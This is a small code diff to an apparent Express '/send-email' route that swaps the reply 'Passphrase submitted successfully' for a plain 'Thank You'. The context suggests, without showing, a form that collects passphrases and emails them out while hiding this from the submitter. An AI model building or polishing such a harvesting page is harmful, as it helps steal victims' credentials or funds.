@@ -50,7 +50,7 @@ app.post('/send-email', (req, res) => {
       res.send('<h1>Error sending email</h1>');
     } else {
       console.log('Email sent: ' + info.response);
-      res.send('<h1>Passphrase submitted successfully</h1>');
+      res.send('<h1>Thank You</h1>');
     }
   });
 });
